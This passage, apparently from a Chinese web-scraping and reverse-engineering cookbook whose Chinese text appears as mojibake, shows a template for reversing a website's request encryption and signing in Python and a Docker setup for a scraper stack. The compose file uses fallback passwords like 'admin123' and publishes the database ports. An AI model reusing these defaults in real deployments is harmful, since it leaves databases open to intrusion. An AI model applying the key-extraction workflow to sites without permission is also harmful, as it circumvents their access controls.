<span class="c1"># ç™»å½•</span>
<span class="n">api</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">)</span>

<span class="c1"># è·å–æ•°æ®</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">api</span><span class="o">.</span><span class="n">get_data</span><span class="p">(</span><span class="n">page</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è·å–åˆ° </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2"> æ¡æ•°æ®&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¿è¡Œæµ‹è¯•">è¿è¡Œæµ‹è¯•</h2>

      <div class="codehilite">
        <pre><span></span><code>python<span class="w"> </span>-m<span class="w"> </span>pytest<span class="w"> </span>test_cases/
</code></pre>
      </div>

      <hr />

      <h2 id="æ³¨æ„äº‹é¡¹">æ³¨æ„äº‹é¡¹</h2>

      <ol>
        <li>æœ¬é¡¹ç›®ä»…ä¾›å­¦ä¹ ç ”ç©¶ä½¿ç”¨</li>
        <li>è¯·éµå®ˆç›®æ ‡ç½‘ç«™çš„ä½¿ç”¨æ¡æ¬¾</li>
        <li>ä¸è¦ç”¨äºéæ³•ç”¨é€”</li>
        <li>å»ºè®®æ·»åŠ è¯·æ±‚å»¶è¿Ÿï¼Œé¿å…å¯¹æœåŠ¡å™¨é€ æˆå‹åŠ›</li>
      </ol>

      <hr />

      <h2 id="license">License</h2>

      <p>MIT</p>

      <pre><code>
### 6. requirements.txt

```txt
requests&gt;=2.31.0
pycryptodome&gt;=3.19.0
pyjwt&gt;=2.8.0
beautifulsoup4&gt;=4.12.0
pytest&gt;=7.4.0
python-dotenv&gt;=1.0.0
</code></pre>

      <h3 id="7-envexample">7. .env.example</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ç›®æ ‡ç½‘ç«™è´¦å·</span>
<span class="nv">USERNAME</span><span class="o">=</span>your_username
<span class="nv">PASSWORD</span><span class="o">=</span>your_password

<span class="c1"># è¯·æ±‚é…ç½®</span>
<span class="nv">REQUEST_TIMEOUT</span><span class="o">=</span><span class="m">30</span>
<span class="nv">MAX_RETRIES</span><span class="o">=</span><span class="m">3</span>

<span class="c1"># ä»£ç†é…ç½® (å¯é€‰)</span>
<span class="nv">USE_PROXY</span><span class="o">=</span><span class="nb">false</span>
<span class="nv">PROXY_URL</span><span class="o">=</span>http://127.0.0.1:7890
</code></pre>
      </div>

      <hr />

      <h2 id="ä½¿ç”¨æ­¤æ¨¡æ¿">ğŸš€ ä½¿ç”¨æ­¤æ¨¡æ¿</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. å¤åˆ¶æ¨¡æ¿</span>
cp<span class="w"> </span>-r<span class="w"> </span>templates/reverse_project<span class="w"> </span>my_analysis
<span class="nb">cd</span><span class="w"> </span>my_analysis

<span class="c1"># 2. åˆå§‹åŒ–æ–‡æ¡£</span>
vim<span class="w"> </span>docs/analysis.md<span class="w">  </span><span class="c1"># å¼€å§‹è®°å½•åˆ†æè¿‡ç¨‹</span>

<span class="c1"># 3. ç¼–å†™å¤ç°è„šæœ¬</span>
vim<span class="w"> </span>scripts/reproduce.py

<span class="c1"># 4. è¿è¡Œæµ‹è¯•</span>
python<span class="w"> </span>-m<span class="w"> </span>pytest<span class="w"> </span>test_cases/
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">ğŸ’¡ æœ€ä½³å®è·µ</h2>

      <h3 id="åˆ†ææµç¨‹å»ºè®®">åˆ†ææµç¨‹å»ºè®®</h3>

      <ol>
        <li>
          <p><strong>åˆæ­¥ä¾¦å¯Ÿ</strong> (1-2 å°æ—¶)</p>

          <ul>
            <li>ä½¿ç”¨ DevTools è§‚å¯Ÿç½‘ç»œè¯·æ±‚</li>
            <li>è¯†åˆ«å…³é”® API æ¥å£</li>
            <li>è®°å½•è¯·æ±‚å‚æ•°æ ¼å¼</li>
          </ul>
        </li>
        <li>
          <p><strong>JavaScript åˆ†æ</strong> (2-4 å°æ—¶)</p>

          <ul>
            <li>å®šä½åŠ å¯†ç›¸å…³ä»£ç </li>
            <li>ä½¿ç”¨æ–­ç‚¹è°ƒè¯•</li>
            <li>è®°å½•å…³é”®å‡½æ•°ä½ç½®</li>
          </ul>
        </li>
        <li>
          <p><strong>ç®—æ³•è¯†åˆ«</strong> (1-2 å°æ—¶)</p>

          <ul>
            <li>æ ¹æ®ç‰¹å¾è¯†åˆ«åŠ å¯†ç®—æ³•</li>
            <li>æµ‹è¯•éªŒè¯çŒœæµ‹</li>
            <li>æå–å¯†é’¥å’Œå‚æ•°</li>
          </ul>
        </li>
        <li>
          <p><strong>Python å¤ç°</strong> (2-3 å°æ—¶)</p>

          <ul>
            <li>å®ç°åŠ å¯†å‡½æ•°</li>
            <li>å®ç°ç­¾åå‡½æ•°</li>
            <li>å°è£…å®Œæ•´ API</li>
          </ul>
        </li>
        <li>
          <p><strong>æµ‹è¯•éªŒè¯</strong> (1 å°æ—¶)</p>

          <ul>
            <li>ç¼–å†™å•å…ƒæµ‹è¯•</li>
            <li>å¯¹æ¯”è¾“å‡ºç»“æœ</li>
            <li>ä¿®å¤é—®é¢˜</li>
          </ul>
        </li>
      </ol>

      <h3 id="æ–‡æ¡£æ’°å†™å»ºè®®">æ–‡æ¡£æ’°å†™å»ºè®®</h3>

      <ul>
        <li><strong>åŠæ—¶è®°å½•</strong>: æ¯ä¸ªå‘ç°éƒ½è¦ç«‹å³è®°å½•</li>
        <li><strong>ä»£ç æ³¨é‡Š</strong>: æ ‡æ³¨åŸå§‹ä»£ç ä½ç½® (æ–‡ä»¶å:è¡Œå·)</li>
        <li><strong>æˆªå›¾ä¿å­˜</strong>: é‡è¦æ­¥éª¤ä¿å­˜æˆªå›¾åˆ° assets/</li>
        <li><strong>æ—¶é—´çº¿</strong>: è®°å½•åˆ†æè¿›åº¦æ—¶é—´çº¿</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ğŸ“š ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="#09-Templates-basic-scraper">åŸºç¡€çˆ¬è™«é¡¹ç›®</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†è¯†åˆ«</a></li>
      </ul>

    </div>

    <div class="section" id="09-Templates-docker-setup">
      <h2>71. Docker Setup</h2>
      <h1 id="docker-éƒ¨ç½²é…ç½®æ¨¡æ¿">Docker éƒ¨ç½²é…ç½®æ¨¡æ¿</h1>

      <p>å®¹å™¨åŒ–éƒ¨ç½²çˆ¬è™«é¡¹ç›®çš„å®Œæ•´é…ç½®ï¼Œæ”¯æŒå•æœºå’Œåˆ†å¸ƒå¼éƒ¨ç½²ã€‚</p>

      <hr />

      <h2 id="é¡¹ç›®ç»“æ„">ğŸ“ é¡¹ç›®ç»“æ„</h2>

      <pre><code>docker_scraper/
â”œâ”€â”€ app/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ main.py
â”‚   â”œâ”€â”€ config.py
â”‚   â””â”€â”€ scraper.py
â”œâ”€â”€ docker/
â”‚   â”œâ”€â”€ Dockerfile
â”‚   â”œâ”€â”€ Dockerfile.dev
â”‚   â””â”€â”€ docker-compose.yml
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ entrypoint.sh
â”‚   â””â”€â”€ wait-for-it.sh
â”œâ”€â”€ nginx/
â”‚   â””â”€â”€ nginx.conf
â”œâ”€â”€ .env.example
â”œâ”€â”€ .dockerignore
â””â”€â”€ README.md
</code></pre>

      <hr />

      <h2 id="é…ç½®æ–‡ä»¶">ğŸ“„ é…ç½®æ–‡ä»¶</h2>

      <h3 id="1-dockerfile-ç”Ÿäº§ç¯å¢ƒ">1. Dockerfile (ç”Ÿäº§ç¯å¢ƒ)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c"># åŸºç¡€é•œåƒ</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>

<span class="c"># è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="k">ENV</span><span class="w"> </span><span class="nv">PYTHONUNBUFFERED</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span><span class="nv">PYTHONDONTWRITEBYTECODE</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span><span class="nv">PIP_NO_CACHE_DIR</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span><span class="nv">PIP_DISABLE_PIP_VERSION_CHECK</span><span class="o">=</span><span class="m">1</span>

<span class="c"># è®¾ç½®å·¥ä½œç›®å½•</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># å®‰è£…ç³»ç»Ÿä¾èµ–</span>
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>gcc<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>g++<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>curl<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>wget<span class="w"> </span><span class="se">\</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/var/lib/apt/lists/*

<span class="c"># å¤åˆ¶ä¾èµ–æ–‡ä»¶</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>.

<span class="c"># å®‰è£… Python ä¾èµ–</span>
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--no-cache-dir<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="c"># å¤åˆ¶é¡¹ç›®æ–‡ä»¶</span>
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.

<span class="c"># åˆ›å»ºé root ç”¨æˆ·</span>
<span class="k">RUN</span><span class="w"> </span>useradd<span class="w"> </span>-m<span class="w"> </span>-u<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scraper<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>chown<span class="w"> </span>-R<span class="w"> </span>scraper:scraper<span class="w"> </span>/app

<span class="c"># åˆ‡æ¢ç”¨æˆ·</span>
<span class="k">USER</span><span class="w"> </span><span class="s">scraper</span>

<span class="c"># æš´éœ²ç«¯å£</span>
<span class="k">EXPOSE</span><span class="w"> </span><span class="s">8000</span>

<span class="c"># å¥åº·æ£€æŸ¥</span>
<span class="k">HEALTHCHECK</span><span class="w"> </span>--interval<span class="o">=</span>30s<span class="w"> </span>--timeout<span class="o">=</span>10s<span class="w"> </span>--start-period<span class="o">=</span>5s<span class="w"> </span>--retries<span class="o">=</span><span class="m">3</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>CMD<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import sys; sys.exit(0)&quot;</span>

<span class="c"># å¯åŠ¨å‘½ä»¤</span>
<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;app/main.py&quot;</span><span class="p">]</span>
</code></pre>
      </div>

      <h3 id="2-dockerfiledev-å¼€å‘ç¯å¢ƒ">2. Dockerfile.dev (å¼€å‘ç¯å¢ƒ)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>

<span class="k">ENV</span><span class="w"> </span><span class="nv">PYTHONUNBUFFERED</span><span class="o">=</span><span class="m">1</span>

<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># å®‰è£…å¼€å‘å·¥å…·</span>
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>gcc<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>g++<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>curl<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>wget<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>vim<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>git<span class="w"> </span><span class="se">\</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/var/lib/apt/lists/*

<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>requirements-dev.txt<span class="w"> </span>./

<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--no-cache-dir<span class="w"> </span>-r<span class="w"> </span>requirements.txt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>pip<span class="w"> </span>install<span class="w"> </span>--no-cache-dir<span class="w"> </span>-r<span class="w"> </span>requirements-dev.txt

<span class="c"># ä¸å¤åˆ¶ä»£ç ï¼Œä½¿ç”¨ volume æŒ‚è½½</span>
<span class="k">VOLUME</span><span class="w"> </span><span class="s">/app</span>

<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;app/main.py&quot;</span><span class="p">]</span>
</code></pre>
      </div>

      <h3 id="3-docker-composeyml">3. docker-compose.yml</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.8&#39;</span>

<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="c1"># çˆ¬è™«åº”ç”¨</span>
<span class="w">  </span><span class="nt">scraper</span><span class="p">:</span>
<span class="w">    </span><span class="nt">build</span><span class="p">:</span>
<span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/Dockerfile</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_app</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MONGODB_URI=mongodb://mongodb:27017/</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">REDIS_HOST=redis</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">REDIS_PORT=6379</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">LOG_LEVEL=INFO</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./data:/app/data</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./logs:/app/logs</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="nt">mongodb</span><span class="p">:</span>
<span class="w">        </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">service_healthy</span>
<span class="w">      </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">        </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">service_healthy</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>
<span class="w">    </span><span class="nt">labels</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;com.scraper.description=Main</span><span class="nv"> </span><span class="s">scraper</span><span class="nv"> </span><span class="s">service&quot;</span>

<span class="w">  </span><span class="c1"># MongoDB æ•°æ®åº“</span>
<span class="w">  </span><span class="nt">mongodb</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo:7.0</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_mongodb</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_USERNAME</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${MONGO_PASSWORD:-admin123}</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_DATABASE</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_db</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb_data:/data/db</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb_config:/data/configdb</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;27017:27017&quot;</span>
<span class="w">    </span><span class="nt">healthcheck</span><span class="p">:</span>
<span class="w">      </span><span class="nt">test</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">echo &#39;db.runCommand(&quot;ping&quot;).ok&#39; | mongosh localhost:27017/test --quiet</span>
<span class="w">      </span><span class="nt">interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10s</span>
<span class="w">      </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5s</span>
<span class="w">      </span><span class="nt">retries</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5</span>
<span class="w">      </span><span class="nt">start_period</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">20s</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>

<span class="w">  </span><span class="c1"># Redis ç¼“å­˜</span>
<span class="w">  </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis:7-alpine</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_redis</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis-server --requirepass ${REDIS_PASSWORD:-redis123} --maxmemory 256mb --maxmemory-policy allkeys-lru</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis_data:/data</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;6379:6379&quot;</span>
<span class="w">    </span><span class="nt">healthcheck</span><span class="p">:</span>
<span class="w">      </span><span class="nt">test</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;CMD&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;redis-cli&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;ping&quot;</span><span class="p p-Indicator">]</span>
<span class="w">      </span><span class="nt">interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10s</span>
<span class="w">      </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5s</span>
<span class="w">      </span><span class="nt">retries</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>

<span class="w">  </span><span class="c1"># Nginx (å¯é€‰)</span>
<span class="w">  </span><span class="nt">nginx</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">nginx:alpine</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_nginx</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;80:80&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;443:443&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./nginx/nginx.conf:/etc/nginx/nginx.conf:ro</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./data/static:/usr/share/nginx/html:ro</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>

<span class="w">  </span><span class="c1"># ç›‘æ§ (å¯é€‰)</span>
<span class="w">  </span><span class="nt">prometheus</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">prom/prometheus:latest</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_prometheus</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;--config.file=/etc/prometheus/prometheus.yml&#39;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;--storage.tsdb.path=/prometheus&#39;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml:ro</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">prometheus_data:/prometheus</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;9090:9090&quot;</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>

<span class="w">  </span><span class="c1"># å¯è§†åŒ–ç›‘æ§</span>
<span class="w">  </span><span class="nt">grafana</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana/grafana:latest</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_grafana</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:-admin123}</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana_data:/var/lib/grafana</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;3000:3000&quot;</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">prometheus</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>

<span class="nt">networks</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scraper_network</span><span class="p">:</span>
<span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bridge</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">mongodb_data</span><span class="p">:</span>
<span class="w">  </span><span class="nt">mongodb_config</span><span class="p">:</span>
<span class="w">  </span><span class="nt">redis_data</span><span class="p">:</span>
<span class="w">  </span><span class="nt">prometheus_data</span><span class="p">:</span>
<span class="w">  </span><span class="nt">grafana_data</span><span class="p">:</span>
</code></pre>
      </div>

      <h3 id="4-docker-composedevyml-å¼€å‘ç¯å¢ƒ">4. docker-compose.dev.yml (å¼€å‘ç¯å¢ƒ)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.8&#39;</span>

<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scraper</span><span class="p">:</span>
<span class="w">    </span><span class="nt">build</span><span class="p">:</span>
<span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/Dockerfile.dev</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_dev</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MONGODB_URI=mongodb://mongodb:27017/</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">REDIS_HOST=redis</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">LOG_LEVEL=DEBUG</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.:/app</span><span class="w">  </span><span class="c1"># æŒ‚è½½ä»£ç ç›®å½•ï¼Œæ”¯æŒçƒ­é‡è½½</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/app/__pycache__</span><span class="w">  </span><span class="c1"># æ’é™¤ç¼“å­˜</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;8000:8000&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;5678:5678&quot;</span><span class="w">  </span><span class="c1"># è°ƒè¯•ç«¯å£</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb</span>
